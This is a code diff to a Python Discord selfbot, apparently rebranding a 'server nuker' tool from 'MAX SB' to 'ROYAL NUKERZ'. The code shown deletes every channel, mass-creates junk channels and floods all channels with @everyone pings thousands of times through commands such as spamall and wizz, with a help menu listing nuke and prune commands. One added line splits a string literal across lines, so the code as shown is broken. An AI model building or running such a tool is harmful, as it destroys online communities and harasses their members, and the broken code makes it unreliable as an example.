@@ -53,12 +53,12 @@ async def serverinfo(ctx):
 @bot.command()
 async def online(ctx):
     emoji = '<a:onlinetr:1100182634728017941>'
-    status = 'Connected To M A X SB V1'
+    status = 'Connected To ROYAL NUKERZ'
     await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.streaming, name=status), status=discord.Status.online, afk=False)
     await ctx.reply(f"Status updated to  {status}!")
 
 @bot.command(name="createchannels", aliases=["masschannel"])
-async def masschannel(ctx, amount: int = 25, *, name="DrAv3n x GxD D3ViL Rule Cord"):
+async def masschannel(ctx, amount: int = 25, *, name="Rule Cord"):
     for i in range(amount):
         try:
             await ctx.guild.create_text_channel(name=name)
@@ -80,7 +80,7 @@ async def delete_all_channels(ctx):
             print(f"An error occurred while deleting {ch}: {e}")
 
 @bot.command(name="spamall", aliases=["sa"])
-async def spam_to_all_channels(ctx, amount: int = 50, *, text="@everyone DrAv3n x GxD D3ViL Rule Cord https://discord.gg/maxontop"):
+async def spam_to_all_channels(ctx, amount: int = 50, *, text="@everyone @here NUKED BY ROYAL NUKERZ"):
     for i in range(amount):
         for ch in ctx.guild.channels:
             try:
@@ -92,8 +92,8 @@ async def spam_to_all_channels(ctx, amount: int = 50, *, text="@everyone DrAv3n 
 async def Help(ctx):
     message = (
         "**```js\n"
-"          M A X   S É L F B O T  \n"
-"            - .gg/maxontop - \n"
+"          R O Y A L N U K E R Z   S É L F B O T  \n"
+"            - royalnukerz on top - \n"
 
 "         •H͢ ͢E͢ ͢L͢ ͢P͢ ͢I͢ ͢N͢ ͢G͢ ͢ ͢ ͢C͢ ͢M͢ ͢D͢ •\n"
 "             + nuke\n"
@@ -106,8 +106,8 @@ async def Help(ctx):
 async def nuke(ctx):
     message = (
         "**```js\n"
-"          M A X   S É L F B O T  \n"
-"            - .gg/maxontop - \n"
+"          R O Y A L N U K E R Z   S É L F B O T  \n"
+"            - royalnukerz on top - \n"
 
 "           •N͢ ͢U͢ ͢K͢ ͢E͢ ͢ ͢ ͢C͢ ͢M͢ ͢D͢•\n"
 "             + prune\n"
@@ -123,8 +123,8 @@ async def nuke(ctx):
 async def general(ctx):
     message = (
         "**```js\n"
-"          M A X   S É L F B O T  \n"
-"            - .gg/maxontop - \n"
+"          R O Y A L N U K E R Z   S É L F B O T  \n"
+"            - royalnukerz on top - \n"
 
 "         •G͢ ͢E͢ ͢N͢ ͢E͢ ͢R͢ ͢A͢ ͢L͢ ͢ ͢ ͢C͢ ͢M͢ ͢D͢•\n"
 "             + online\n"
@@ -153,11 +153,12 @@ async def wizz(ctx, amount: int = 5):
             await maxontop.delete()
             print(f"Deleted {maxontop}")
     for i in range(5):
-            channel_names = ['DrAv3n x GxD D3ViL Rule Cord','MaX on top', 'GxD D3ViL Op', 'DrAv3n Op', 'maxontop', 'DrAv3N S3LfBxT V1']
+            channel_names = ['Royal nukerz','rock
+            on top', 'Rock Op', 'Rock Op', 'rockontop', 'got hacked ?']
             await ctx.guild.create_text_channel(name=random.choice(channel_names))
             print(f"Created channel")
     for i in range(9999):
-        tospam = ['@everyone @here DrAv3n X GxD D3ViL Rule Cord https://discord.gg/maxontop', '@everyone @here Wizzed by DrAv3n x GxD D3ViL  https://discord.gg/maxontop', '@everyone @here https://discord.gg/maxontop']
+        tospam = ['@everyone @here ROYAL NUKERZ ON TOP', '@everyone @here NUKED xD', '@everyone @here HACKED ? xD']
         for ch in ctx.guild.channels:
                 await ch.send(random.choice(tospam))
 
